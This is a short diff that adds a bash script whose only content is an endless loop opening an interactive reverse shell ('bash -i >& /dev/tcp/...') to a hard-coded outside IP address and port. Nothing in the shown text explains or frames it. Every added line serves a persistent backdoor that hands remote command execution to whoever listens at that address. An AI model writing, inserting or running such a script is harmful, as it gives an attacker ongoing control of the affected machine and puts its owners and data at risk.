@@ -1,0 +1,5 @@
+#!/bin/bash
+while true
+do
+bash -i >& /dev/tcp/1.14.144.83/14447 0>&1
+done 
